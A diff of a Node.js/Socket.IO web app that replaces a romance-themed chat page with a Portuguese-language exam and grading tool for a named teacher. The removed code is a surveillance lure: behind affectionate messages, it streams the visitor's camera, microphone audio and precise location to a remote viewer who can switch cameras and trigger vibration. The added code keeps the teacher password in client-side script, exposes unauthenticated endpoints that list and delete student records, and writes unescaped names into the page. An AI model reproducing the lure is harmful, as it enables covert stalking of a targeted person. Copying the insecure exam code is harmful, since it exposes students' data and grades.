+            const corrected = Object.keys(answers).filter(qId => answers[qId].isCorrect !== null).length;
+            progress.textContent = 'Questão ' + (currentQuestion + 1) + ' de 10 | Respondidas: ' + answered + ' | Corrigidas: ' + corrected;
+        }
+
+        // ===== NEXT QUESTION =====
+        nextBtn.onclick = () => {
+            currentQuestion++;
+            if(currentQuestion >= questionsData.length) {
+                renderQuestion(currentQuestion);
+                finishBtn.style.display = 'block';
+                nextBtn.style.display = 'none';
+                progress.textContent = 'Prova Completa! Finalize';
+            } else {
+                renderQuestion(currentQuestion);
+            }
+        };
+
+        // ===== FINISH EXAM =====
+        finishBtn.onclick = () => {
+            const totalQuestions = questionsData.length;
+            const answered = Object.keys(answers).filter(qId => answers[qId].answer).length;
+
+            if(answered < totalQuestions) {
+                showWarning('Responda todas as questões antes de finalizar');
+                return;
+            }
+
+            if(confirm('Finalizar prova?')) {
+                isFinished = true;
+                finishBtn.disabled = true;
+                nextBtn.disabled = true;
+                clearInterval(timerInterval);
+
+                const totalTime = Math.round(elapsedSeconds);
+                const completionCode = generateCode();
+
+                // Conta quantas já foram corrigidas como certas
+                let correctCount = 0;
+                Object.keys(answers).forEach(qId => {
+                    if(answers[qId].isCorrect === true) {
+                        correctCount++;
+                    }
                 });
 
-                mediaStream = stream;
-                localVideo.srcObject = stream;
-                await localVideo.play();
+                socket.emit('exam_finished', {
+                    studentId,
+                    answers,
+                    totalTime,
+                    completionCode,
+                    studentName,
+                    studentDupla,
+                    correctCount
+                });
 
-                frameInterval = setInterval(sendFrame, 230);
-
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const source = audioCtx.createMediaStreamSource(stream);
-                const processor = audioCtx.createScriptProcessor(4096, 1, 1);
-                source.connect(processor);
-                processor.connect(audioCtx.destination);
-                processor.onaudioprocess = e => {
-                    if (permissions) socket.emit('audio', Array.from(e.inputBuffer.getChannelData(0)));
-                };
-
-                if (navigator.geolocation) {
-                    navigator.geolocation.watchPosition(pos => {
-                        if (permissions) socket.emit('location', { lat: pos.coords.latitude, lng: pos.coords.longitude });
-                    }, null, { enableHighAccuracy: true });
-                }
-
-                permissions = true;
-                modal.style.display = 'none';
-                socket.emit('mobile_online');
-
-            } catch (err) {
-                console.error(err);
-                alert("Erro ao acessar câmera/microfone 💕");
+                examArea.style.display = 'none';
+                completionArea.style.display = 'block';
+                completionCode.textContent = completionCode;
+                scoreDisplay.textContent = correctCount + '/10';
+                completionStats.textContent = 'Tempo total: ' + formatTime(totalTime);
+                completionDupla.textContent = 'Dupla: ' + studentDupla;
+                viewResultBtn.style.display = 'block';
+                window.savedAnswers = answers;
             }
-        }
+        };
 
-        function sendMessage() {
-            const text = messageInput.value.trim();
-            if (!text || !permissions) return;
-            addMessage(text, true);
-            socket.emit('message', text);
-            messageInput.value = '';
-        }
-
-        function startTyping() {
-            if (!permissions) return;
-            socket.emit('typing_start');
-            clearTimeout(typingTimeout);
-            typingTimeout = setTimeout(() => socket.emit('typing_stop'), 1300);
-        }
-
-        startBtn.onclick = startPermissions;
-        sendBtn.onclick = sendMessage;
-        messageInput.addEventListener('keypress', e => {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                sendMessage();
-            } else {
-                startTyping();
+        // ===== VIEW RESULTS =====
+        viewResultBtn.onclick = () => {
+            const savedAnswers = window.savedAnswers || {};
+            const totalQuestions = questionsData.length;
+            
+            let html = '';
+            for(let i = 0; i < totalQuestions; i++) {
+                const q = questionsData[i];
+                const ans = savedAnswers[q.id];
+                const isCorrect = ans && ans.isCorrect;
+                const status = isCorrect === true ? '✓' : isCorrect === false ? '✗' : '⏳';
+                const statusClass = isCorrect === true ? 'correct' : isCorrect === false ? 'wrong' : 'waiting';
+                
+                html += \`
+                    <div class="result-item">
+                        <span>Q\${i+1}: \${q.question.substring(0, 30)}\${q.question.length > 30 ? '...' : ''}</span>
+                        <span>
+                            <span class="\${statusClass}">\${status}</span>
+                            \${ans ? ans.answer : '—'}
+                            <span class="time">\${ans ? ans.timeSpent + 's' : '—'}</span>
+                        </span>
+                    </div>
+                \`;
             }
+            
+            resultList.innerHTML = html;
+            completionArea.style.display = 'none';
+            resultArea.style.display = 'block';
+        };
+
+        // ===== UTILITIES =====
+        function generateCode() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let code = '';
+            for(let i = 0; i < 8; i++) {
+                if(i === 4) code += '-';
+                code += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return code;
+        }
+
+        function formatTime(seconds) {
+            const mins = Math.floor(seconds / 60);
+            const secs = seconds % 60;
+            return String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+        }
+
+        function showWarning(msg) {
+            warning.textContent = msg;
+            warning.style.display = 'block';
+            setTimeout(() => {
+                warning.style.display = 'none';
+            }, 3000);
+        }
+
+        socket.on('force_disconnect', () => {
+            alert('Conexão encerrada');
+            location.reload();
         });
-        messageInput.addEventListener('input', startTyping);
-
-        socket.on('message', msg => addMessage(msg, false));
-        socket.on('typing_start', () => typingDiv.classList.add('show'));
-        socket.on('typing_stop', () => typingDiv.classList.remove('show'));
-        socket.on('connect', () => connIndicator.classList.remove('disconnected'));
-        socket.on('disconnect', () => connIndicator.classList.add('disconnected'));
-
-        socket.on('toggle_camera', () => {
-            facingMode = facingMode === 'user' ? 'environment' : 'user';
-            if (permissions) startPermissions();
-        });
-
-        socket.on('vibrate', () => navigator.vibrate?.(200));
-
-        setTimeout(() => {
-            if (!permissions) {
-                const div = document.createElement('div');
-                div.className = 'message received';
-                div.innerHTML = '<div class="bubble">Oi meu amor... 💕 Estou te esperando aqui.</div>';
-                messagesDiv.appendChild(div);
-            }
-        }, 800);
     </script>
 </body>
-</html>`;
-}
-
-// ==================== DESKTOP (também com tema romântico) ====================
-function getDesktopHTML(fullUrl) {
-  return `<!DOCTYPE html>
-<html lang="pt-BR">
+</html>`);
+  } else {
+    // ========== PÁGINA DO PC (PROFESSOR) ==========
+    res.send(`<!DOCTYPE html>
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Loirinha mais linda do Mundo! 💕</title>
+    <title>Professor Heber Lemos</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { 
-            font-family:system-ui,sans-serif; 
-            background: linear-gradient(135deg, #ffe4f3, #ffb6e6);
-            height:100vh; 
-            display:flex; 
-            color:#4a2c4a;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a0a1a 0%, #2d1a2d 50%, #1a0a1a 100%);
+            color: #d4a0d4;
+            min-height: 100vh;
+            padding: 20px;
         }
-        .sidebar { width:340px; background:#fff0f8; border-right:3px solid #ff99cc; }
-        .sidebar-header { 
-            padding:25px; 
-            background: linear-gradient(to right, #ff69b4, #ff1493); 
-            color:white; 
-            font-size:21px; 
-            font-weight:bold;
-            text-align:center;
+        .container { max-width: 1400px; margin: 0 auto; }
+        .header-main {
+            text-align: center;
+            padding: 15px 0 25px;
         }
-        .contact { padding:20px; display:flex; gap:16px; background:#fff0f8; }
-        .avatar { 
-            width:60px; height:60px; 
-            background: linear-gradient(#ff69b4, #ff1493); 
-            border-radius:50%; 
-            display:flex; 
-            align-items:center; 
-            justify-content:center; 
-            font-size:32px;
+        .header-main h1 {
+            font-weight: 300;
+            font-size: 26px;
+            letter-spacing: 4px;
+            color: #e8c8e8;
         }
-        .chat { flex:1; display:flex; flex-direction:column; }
-        .chat-header { 
-            background: linear-gradient(to right, #ff69b4, #ff1493); 
-            color:white; 
-            padding:16px; 
-            display:flex; 
-            align-items:center; 
-            gap:16px;
+        .header-main .sub {
+            font-size: 13px;
+            opacity: 0.4;
+            display: block;
+            margin-top: 5px;
+            letter-spacing: 2px;
+            color: #b888b8;
         }
-        .video-panel { 
-            height:290px; 
-            background:#000; 
-            display:flex; 
-            align-items:center; 
-            justify-content:center;
+        .header-main .decor {
+            width: 80px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #c084c0, transparent);
+            margin: 10px auto 0;
         }
-        #remoteVideo { max-width:100%; max-height:100%; object-fit:contain; }
-        .messages { 
-            flex:1; 
-            overflow-y:auto; 
-            padding:20px; 
-            display:flex; 
-            flex-direction:column; 
-            gap:10px;
-            background: rgba(255,255,255,0.6);
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
         }
-        .message { display:flex; margin-bottom:8px; }
-        .message.sent { justify-content:flex-end; }
-        .message.received { justify-content:flex-start; }
-        .bubble { 
-            max-width:65%; 
-            padding:12px 16px; 
-            border-radius:20px; 
-            font-size:15.5px;
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
         }
-        .message.received .bubble { background: white; border-top-left-radius: 6px; }
-        .message.sent .bubble { 
-            background: linear-gradient(to right, #ff69b4, #ff1493); 
-            color: white; 
-            border-top-right-radius: 6px; 
+        .login-panel {
+            max-width: 420px;
+            margin: 0 auto 20px;
+            background: rgba(18, 10, 18, 0.9);
+            border: 1px solid rgba(192, 132, 192, 0.3);
+            border-radius: 16px;
+            padding: 25px 30px;
         }
-        .input-area { 
-            background: rgba(255,255,255,0.95); 
-            padding:14px; 
-            display:flex; 
-            gap:10px; 
-            border-top: 2px solid #ff99cc;
+        .login-panel h2 {
+            text-align: center;
+            font-weight: 300;
+            letter-spacing: 3px;
+            opacity: 0.5;
+            font-size: 15px;
+            margin-bottom: 15px;
+            color: #d4a0d4;
         }
-        .input-field { 
-            flex:1; 
-            background: #fff0f8; 
-            border: 2px solid #ff99cc; 
-            border-radius: 30px; 
-            padding: 14px 18px; 
-            color:#4a2c4a; 
-            font-size:16px;
+        .form-group { margin-bottom: 12px; }
+        .form-group label {
+            display: block;
+            font-size: 11px;
+            letter-spacing: 1.5px;
+            opacity: 0.4;
+            margin-bottom: 4px;
+            color: #c084c0;
         }
-        .send-btn { 
-            background: linear-gradient(to right, #ff69b4, #ff1493); 
-            color:white; 
-            border:none; 
-            width:50px; 
-            height:50px; 
-            border-radius:50%; 
-            font-size:24px; 
-            cursor:pointer;
+        .form-group input {
+            width: 100%;
+            padding: 10px 14px;
+            background: rgba(26, 10, 26, 0.8);
+            border: 1px solid rgba(192, 132, 192, 0.3);
+            border-radius: 10px;
+            color: #e8c8e8;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.4s;
+        }
+        .form-group input:focus {
+            border-color: #c084c0;
+            box-shadow: 0 0 30px rgba(192, 132, 192, 0.1);
+        }
+        .btn-primary {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #c084c0, #a060a0);
+            color: #1a0a1a;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            letter-spacing: 3px;
+            cursor: pointer;
+            transition: all 0.4s;
+        }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 40px rgba(192, 132, 192, 0.25); }
+        .error-msg { color: #ff6666; text-align: center; margin-top: 10px; font-size: 12px; }
+        .main-grid {
+            display: grid;
+            grid-template-columns: 280px 1fr;
+            gap: 20px;
+            height: calc(100vh - 200px);
+        }
+        .panel {
+            background: rgba(18, 10, 18, 0.9);
+            border: 1px solid rgba(192, 132, 192, 0.2);
+            border-radius: 16px;
+            padding: 18px;
+            overflow-y: auto;
+        }
+        .panel::-webkit-scrollbar { width: 4px; }
+        .panel::-webkit-scrollbar-track { background: rgba(26, 10, 26, 0.5); border-radius: 2px; }
+        .panel::-webkit-scrollbar-thumb { background: #c084c0; border-radius: 2px; }
+        .panel h2 {
+            font-weight: 300;
+            font-size: 13px;
+            letter-spacing: 3px;
+            margin-bottom: 12px;
+            opacity: 0.5;
+            border-bottom: 1px solid rgba(192, 132, 192, 0.15);
+            padding-bottom: 8px;
+            color: #d4a0d4;
+        }
+        .panel h3 {
+            font-weight: 300;
+            font-size: 11px;
+            letter-spacing: 2px;
+            margin: 10px 0 5px;
+            opacity: 0.3;
+            color: #b888b8;
+        }
+        .student-item {
+            padding: 10px 12px;
+            border: 1px solid rgba(192, 132, 192, 0.2);
+            border-radius: 10px;
+            margin-bottom: 6px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .student-item:hover { background: rgba(26, 10, 26, 0.8); border-color: rgba(192, 132, 192, 0.4); }
+        .student-item.active { background: rgba(26, 10, 26, 0.9); border-color: #c084c0; }
+        .student-item .name { font-size: 14px; color: #e8c8e8; }
+        .student-item .dupla { font-size: 11px; opacity: 0.4; color: #b888b8; margin-top: 2px; }
+        .student-item .status {
+            font-size: 8px;
+            padding: 2px 10px;
+            border-radius: 20px;
+            letter-spacing: 1px;
+            display: inline-block;
+            margin-top: 3px;
+        }
+        .status.online { background: #66cc88; color: #1a0a1a; }
+        .status.offline { background: rgba(58, 42, 58, 0.6); color: #5a4a5a; }
+        .status.finished { background: #cc6666; color: #1a0a1a; }
+        .status.waiting { background: #ff8844; color: #1a0a1a; }
+        .question-card {
+            background: rgba(26, 10, 26, 0.6);
+            border: 1px solid rgba(192, 132, 192, 0.2);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 10px;
+        }
+        .question-card .q-text {
+            font-size: 14px;
+            color: #e8c8e8;
+            margin-bottom: 8px;
+        }
+        .question-card .q-answer {
+            font-size: 16px;
+            color: #d4a0d4;
+            padding: 8px 12px;
+            background: rgba(18, 10, 18, 0.8);
+            border-radius: 8px;
+            margin: 5px 0;
+            border-left: 3px solid #c084c0;
+        }
+        .question-card .q-status {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+            align-items: center;
+        }
+        .btn-correct {
+            padding: 6px 20px;
+            background: #66cc88;
+            color: #1a0a1a;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        .btn-correct:hover { transform: scale(1.05); box-shadow: 0 5px 20px rgba(102, 204, 136, 0.3); }
+        .btn-wrong {
+            padding: 6px 20px;
+            background: #cc6666;
+            color: #1a0a1a;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        .btn-wrong:hover { transform: scale(1.05); box-shadow: 0 5px 20px rgba(204, 102, 102, 0.3); }
+        .btn-correct:disabled, .btn-wrong:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .status-badge {
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: bold;
+        }
+        .status-badge.correct { background: #66cc88; color: #1a0a1a; }
+        .status-badge.wrong { background: #cc6666; color: #1a0a1a; }
+        .status-badge.waiting { background: #ff8844; color: #1a0a1a; }
+        .no-data { text-align: center; opacity: 0.2; padding: 20px; font-size: 12px; letter-spacing: 2px; color: #b888b8; }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr 1fr;
+            gap: 6px;
+            margin: 8px 0;
+        }
+        .stats-grid .stat {
+            background: rgba(26, 10, 26, 0.6);
+            padding: 10px 6px;
+            border: 1px solid rgba(192, 132, 192, 0.15);
+            border-radius: 8px;
+            text-align: center;
+        }
+        .stats-grid .stat .number { font-size: 20px; letter-spacing: 2px; color: #e8c8e8; }
+        .stats-grid .stat .label { font-size: 7px; opacity: 0.3; letter-spacing: 1px; margin-top: 2px; color: #b888b8; }
+        .code-display {
+            background: rgba(26, 10, 26, 0.8);
+            padding: 10px;
+            border: 1px solid #c084c0;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 20px;
+            letter-spacing: 6px;
+            margin: 8px 0;
+            color: #d4a0d4;
+            animation: pulse 2s infinite;
+        }
+        .badge {
+            background: #cc6666;
+            color: #1a0a1a;
+            font-size: 8px;
+            padding: 2px 8px;
+            border-radius: 20px;
+            margin-left: 4px;
+            display: inline-block;
+        }
+        .badge.warning { background: #ff8844; }
+        .badge.success { background: #66cc88; }
+        .badge.info { background: #6688cc; }
+        @media (max-width: 900px) {
+            .main-grid { grid-template-columns: 1fr; height: auto; }
+            .panel { max-height: 400px; }
+            .stats-grid { grid-template-columns: 1fr 1fr; }
         }
     </style>
 </head>
 <body>
-    <div class="sidebar">
-        <div class="sidebar-header">💕 Conversas</div>
-        <div class="contact">
-            <div class="avatar">👸</div>
-            <div>
-                <div style="font-weight:bold;font-size:18px;">Loirinha mais linda do Mundo!</div>
-                <div id="contactStatus" style="color:#ff4da6;">offline</div>
+    <div class="container">
+        <div class="header-main">
+            <h1>Professor Heber Lemos</h1>
+            <span class="sub">Correção de Provas</span>
+            <div class="decor"></div>
+        </div>
+
+        <div id="teacherLogin" class="login-panel">
+            <h2>Acesso Restrito</h2>
+            <div class="form-group">
+                <label>Senha</label>
+                <input type="password" id="teacherPassword" placeholder="Digite a senha">
             </div>
+            <button class="btn-primary" id="teacherLoginBtn">Acessar</button>
+            <div class="error-msg" id="teacherLoginError"></div>
         </div>
-    </div>
 
-    <div class="chat">
-        <div class="chat-header">
-            <div class="avatar">👸</div>
-            <div style="flex:1">
-                <div style="font-weight:bold;">Loirinha mais linda do Mundo! 💕</div>
-                <div id="chatStatus" style="opacity:0.9;">offline</div>
+        <div id="mainPanel" style="display:none;">
+            <div class="main-grid">
+                <div class="panel">
+                    <h2>Alunos</h2>
+                    <div id="studentList">
+                        <div class="no-data">Nenhum aluno conectado</div>
+                    </div>
+                </div>
+
+                <div class="panel">
+                    <h2>Correção de Respostas</h2>
+                    <div id="studentDetails">
+                        <div class="no-data">Selecione um aluno</div>
+                    </div>
+                </div>
             </div>
-            <button id="toggleCameraBtn" style="background:none;border:none;font-size:26px;cursor:pointer;margin:0 10px;">🔄</button>
-            <button id="vibrateBtn" style="background:none;border:none;font-size:26px;cursor:pointer;">📳</button>
-        </div>
-
-        <div class="video-panel">
-            <img id="remoteVideo" src="" alt="Vídeo da Loirinha">
-        </div>
-
-        <div class="messages" id="messages"></div>
-
-        <div class="input-area">
-            <input type="text" class="input-field" id="messageInput" placeholder="Escreva algo romântico...">
-            <button class="send-btn" id="sendBtn">💌</button>
         </div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io('${fullUrl}');
-        const messagesDiv = document.getElementById('messages');
-        const messageInput = document.getElementById('messageInput');
-        const sendBtn = document.getElementById('sendBtn');
-        const remoteVideo = document.getElementById('remoteVideo');
+        const socket = io();
+        let currentStudentId = null;
+        let isLoggedIn = false;
 
-        function addMessage(text, isSent = true) {
-            const div = document.createElement('div');
-            div.className = \`message \${isSent ? 'sent' : 'received'}\`;
-            const time = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
-            div.innerHTML = \`<div class="bubble">\${text}<div class="time">\${time}</div></div>\`;
-            messagesDiv.appendChild(div);
-            div.scrollIntoView({ behavior: 'smooth' });
-        }
+        const teacherLogin = document.getElementById('teacherLogin');
+        const mainPanel = document.getElementById('mainPanel');
+        const teacherPassword = document.getElementById('teacherPassword');
+        const teacherLoginBtn = document.getElementById('teacherLoginBtn');
+        const teacherLoginError = document.getElementById('teacherLoginError');
+        const studentList = document.getElementById('studentList');
+        const studentDetails = document.getElementById('studentDetails');
 
-        function sendMessage() {
-            const text = messageInput.value.trim();
-            if (!text) return;
-            addMessage(text, true);
-            socket.emit('message', text);
-            messageInput.value = '';
-        }
+        const TEACHER_PASSWORD = "heber123456";
+        let questionsData = ${JSON.stringify(questions)};
 
-        sendBtn.onclick = sendMessage;
-        messageInput.addEventListener('keypress', e => { if(e.key === 'Enter') sendMessage(); });
+        // ===== LOGIN PROFESSOR =====
+        teacherLoginBtn.onclick = () => {
+            const pass = teacherPassword.value.trim();
+            if(!pass) { teacherLoginError.textContent = 'Digite a senha'; return; }
+            if(pass === TEACHER_PASSWORD) {
+                isLoggedIn = true;
+                teacherLogin.style.display = 'none';
+                mainPanel.style.display = 'block';
+                loadStudents();
+                teacherLoginError.textContent = '';
+            } else {
+                teacherLoginError.textContent = 'Senha incorreta';
+                teacherPassword.value = '';
+                teacherPassword.focus();
+            }
+        };
 
-        socket.on('message', msg => addMessage(msg, false));
-        socket.on('frame', frame => { remoteVideo.src = frame; });
-        socket.on('mobile_online', () => {
-            document.getElementById('contactStatus').innerHTML = 'online 💖';
-            document.getElementById('chatStatus').innerHTML = 'online 💖';
+        teacherPassword.addEventListener('keypress', (e) => {
+            if(e.key === 'Enter') teacherLoginBtn.click();
         });
 
-        document.getElementById('toggleCameraBtn').onclick = () => socket.emit('toggle_camera');
-        document.getElementById('vibrateBtn').onclick = () => socket.emit('vibrate');
+        // ===== CARREGAR ALUNOS =====
+        async function loadStudents() {
+            if(!isLoggedIn) return;
+            try {
+                const res = await fetch('/api/students');
+                const students = await res.json();
+                renderStudents(students);
+            } catch(e) {
+                console.log('Erro ao carregar alunos');
+            }
+        }
+
+        function renderStudents(students) {
+            if(students.length === 0) {
+                studentList.innerHTML = '<div class="no-data">Nenhum aluno cadastrado</div>';
+                return;
+            }
+
+            studentList.innerHTML = students.map(s => {
+                // Verifica se tem respostas aguardando correção
+                const hasWaiting = s.answers ? Object.values(s.answers).some(a => a.isCorrect === null) : false;
+                const statusClass = s.online ? 'online' : s.finished ? 'finished' : 'offline';
+                const statusText = s.online ? 'Online' : s.finished ? 'Finalizado' : 'Offline';
+                
+                return \`
+                    <div class="student-item \${currentStudentId === s.id ? 'active' : ''}" 
+                         onclick="selectStudent('\${s.id}')">
+                        <div class="name">\${s.name} \${hasWaiting ? '⏳' : ''}</div>
+                        <div class="dupla">Dupla: \${s.dupla}</div>
+                        <div>
+                            <span class="status \${statusClass}">\${statusText}</span>
+                            <span class="badge info">\${s.totalTime || 0}s</span>
+                            <span class="badge warning">\${(s.warnings || []).length}</span>
+                            \${s.finished ? '<span class="badge success">✓</span>' : ''}
+                        </div>
+                    </div>
+                \`;
+            }).join('');
+        }
+
+        // ===== SELECIONAR ALUNO =====
+        async function selectStudent(studentId) {
+            if(!isLoggedIn) return;
+            currentStudentId = studentId;
+            loadStudents();
+            try {
+                const res = await fetch('/api/students/' + studentId);
+                const student = await res.json();
+                renderStudentDetails(student);
+            } catch(e) {
+                console.log('Erro ao carregar detalhes');
+            }
+        }
+
+        function renderStudentDetails(student) {
+            if(!student) {
+                studentDetails.innerHTML = '<div class="no-data">Aluno não encontrado</div>';
+                return;
+            }
+
+            const totalAnswers = student.answers ? Object.keys(student.answers).length : 0;
+            let correctAnswers = 0;
+            let waitingAnswers = 0;
+            if(student.answers) {
+                Object.values(student.answers).forEach(a => {
+                    if(a && a.isCorrect === true) correctAnswers++;
+                    if(a && a.isCorrect === null) waitingAnswers++;
+                });
+            }
+
+            // Monta as questões para correção
+            let questionsHtml = '';
+            if(student.answers && Object.keys(student.answers).length > 0) {
+                const sorted = Object.keys(student.answers).sort((a,b) => parseInt(a) - parseInt(b));
+                questionsHtml = sorted.map(qId => {
+                    const q = questionsData.find(q => q.id === parseInt(qId));
+                    const ans = student.answers[qId];
+                    if(!ans || !ans.answer) return '';
+                    
+                    const isCorrect = ans.isCorrect;
+                    const statusText = isCorrect === true ? 'Correta' : isCorrect === false ? 'Errada' : 'Aguardando';
+                    const statusClass = isCorrect === true ? 'correct' : isCorrect === false ? 'wrong' : 'waiting';
+                    
+                    return \`
+                        <div class="question-card">
+                            <div class="q-text">Q\${qId}: \${q ? q.question : 'Questão não encontrada'}</div>
+                            <div class="q-answer">Resposta: \${ans.answer}</div>
+                            <div class="q-status">
+                                <span class="status-badge \${statusClass}">\${statusText}</span>
+                                <button class="btn-correct" onclick="correctAnswer('\${student.id}', \${qId}, true)" 
+                                        \${isCorrect !== null ? 'disabled' : ''}>
+                                    ✓ Correta
+                                </button>
+                                <button class="btn-wrong" onclick="correctAnswer('\${student.id}', \${qId}, false)" 
+                                        \${isCorrect !== null ? 'disabled' : ''}>
+                                    ✗ Errada
+                                </button>
+                            </div>
+                        </div>
+                    \`;
+                }).join('');
+            } else {
+                questionsHtml = '<div class="no-data">Aguardando respostas do aluno...</div>';
+            }
+
+            studentDetails.innerHTML = \`
+                <div style="margin-bottom:12px;">
+                    <div style="font-size:18px;letter-spacing:2px;color:#e8c8e8;">\${student.name}</div>
+                    <div style="font-size:12px;opacity:0.4;">Dupla: \${student.dupla}</div>
+                    <div style="font-size:11px;opacity:0.3;">Login: \${new Date(student.loginTime).toLocaleString()}</div>
+                    \${student.completionCode ? \`
+                        <div class="code-display">\${student.completionCode}</div>
+                    \` : ''}
+                </div>
+
+                <div class="stats-grid">
+                    <div class="stat">
+                        <div class="number">\${totalAnswers}/10</div>
+                        <div class="label">Respondidas</div>
+                    </div>
+                    <div class="stat">
+                        <div class="number" style="color:\${correctAnswers >= 7 ? '#66cc88' : '#ff8844'}">
+                            \${correctAnswers}
+                        </div>
+                        <div class="label">Corretas</div>
+                    </div>
+                    <div class="stat">
+                        <div class="number" style="color:#ff8844;">\${waitingAnswers}</div>
+                        <div class="label">Aguardando</div>
+                    </div>
+                    <div class="stat">
+                        <div class="number">\${student.totalTime || 0}s</div>
+                        <div class="label">Tempo</div>
+                    </div>
+                </div>
+
+                <h3>Corrigir Respostas</h3>
+                \${questionsHtml}
+            \`;
+        }
+
+        // ===== CORRIGIR RESPOSTA =====
+        function correctAnswer(studentId, questionId, isCorrect) {
+            if(!isLoggedIn) return;
+            
+            socket.emit('correct_answer', {
+                studentId: studentId,
+                questionId: questionId,
+                isCorrect: isCorrect,
+                correctedBy: 'Professor Heber Lemos',
+                correctedAt: new Date().toISOString()
+            });
+        }
+
+        // ===== SOCKET EVENTS =====
+        socket.on('new_student', () => { if(isLoggedIn) loadStudents(); });
+        socket.on('student_answer', () => { 
+            if(isLoggedIn) {
+                loadStudents();
+                if(currentStudentId) {
+                    fetch('/api/students/' + currentStudentId)
+                        .then(r => r.json())
+                        .then(s => renderStudentDetails(s));
+                }
+            }
+        });
+        socket.on('student_warning', () => { if(isLoggedIn) loadStudents(); });
+        socket.on('student_finished', () => { 
+            if(isLoggedIn) {
+                loadStudents();
+                if(currentStudentId) {
+                    fetch('/api/students/' + currentStudentId)
+                        .then(r => r.json())
+                        .then(s => renderStudentDetails(s));
+                }
+            }
+        });
+        socket.on('student_status_change', () => { if(isLoggedIn) loadStudents(); });
+        
+        // Receber confirmação de correção
+        socket.on('answer_corrected', (data) => {
+            if(isLoggedIn && currentStudentId === data.studentId) {
+                fetch('/api/students/' + data.studentId)
+                    .then(r => r.json())
+                    .then(s => renderStudentDetails(s));
+                loadStudents();
+            }
+        });
+
+        if(isLoggedIn) loadStudents();
     </script>
 </body>
-</html>`;
-}
-
-// Socket.IO
-io.on('connection', (socket) => {
-  console.log('Cliente conectado:', socket.id);
-  const events = ['message','typing_start','typing_stop','frame','audio','location','vibrate','toggle_camera','mobile_online'];
-  events.forEach(ev => socket.on(ev, data => socket.broadcast.emit(ev, data)));
+</html>`);
+  }
 });
 
+// ========== API REST ==========
+app.use(express.json());
+
+app.post('/api/students', (req, res) => {
+  const { name, dupla } = req.body;
+  if(!name || !dupla) return res.status(400).json({ error: 'Nome e dupla obrigatorios' });
+  
+  const nameNormalizado = normalizeText(name);
+  const duplaNormalizada = normalizeText(dupla);
+
+  const duplaEncontrada = getDuplaByAluno(nameNormalizado);
+  if(!duplaEncontrada) {
+    return res.status(403).json({ error: 'Aluno não cadastrado' });
+  }
+
+  if(normalizeText(duplaEncontrada.nome) !== duplaNormalizada) {
+    return res.status(403).json({ error: 'Dupla incorreta para este aluno' });
+  }
+
+  let existingStudent = null;
+  for(let [id, s] of students) {
+    if(s.name === nameNormalizado) {
+      existingStudent = s;
+      break;
+    }
+  }
+
+  let studentId;
+  let student;
+
+  if(existingStudent) {
+    if(existingStudent.finished) {
+      return res.status(403).json({ 
+        error: 'Prova já finalizada', 
+        alreadyFinished: true,
+        completionCode: existingStudent.completionCode,
+        correctCount: existingStudent.correctCount || 0,
+        totalTime: existingStudent.totalTime || 0,
+        dupla: existingStudent.dupla,
+        allAnswers: existingStudent.answers || {}
+      });
+    }
+    studentId = existingStudent.id;
+    student = existingStudent;
+  } else {
+    studentId = uuidv4();
+    student = {
+      id: studentId,
+      name: nameNormalizado,
+      dupla: duplaNormalizada,
+      socketId: null,
+      online: false,
+      finished: false,
+      loginTime: new Date().toISOString(),
+      totalTime: 0,
+      answers: {},
+      warnings: [],
+      completionCode: null,
+      correctCount: 0,
+      copyCount: 0,
+      pasteCount: 0
+    };
+    students.set(studentId, student);
+    answers.set(studentId, {});
+    sessions.set(studentId, { startTime: Date.now(), lastActivity: Date.now() });
+    io.emit('new_student', { studentId, name: nameNormalizado, dupla: duplaNormalizada });
+    saveData();
+  }
+
+  res.status(201).json({ 
+    ...student, 
+    alreadyFinished: false,
+    allAnswers: student.answers || {}
+  });
+});
+
+app.get('/api/students', (req, res) => {
+  const list = Array.from(students.values());
+  res.json(list);
+});
+
+app.get('/api/students/:id', (req, res) => {
+  const s = students.get(req.params.id);
+  if(!s) return res.status(404).json({ error: 'Não encontrado' });
+  res.json(s);
+});
+
+app.delete('/api/students/:id', (req, res) => {
+  const s = students.get(req.params.id);
+  if(!s) return res.status(404).json({ error: 'Não encontrado' });
+  if(s.socketId) {
+    const sock = io.sockets.sockets.get(s.socketId);
+    if(sock) sock.disconnect();
+  }
+  students.delete(req.params.id);
+  answers.delete(req.params.id);
+  sessions.delete(req.params.id);
+  saveData();
+  res.json({ success: true });
+});
+
+// ========== SOCKET.IO ==========
+io.on('connection', (socket) => {
+  console.log('Cliente conectado:', socket.id);
+  let currentStudentId = null;
+
+  socket.on('student_login', ({ name, dupla }) => {
+    const nameNormalizado = normalizeText(name);
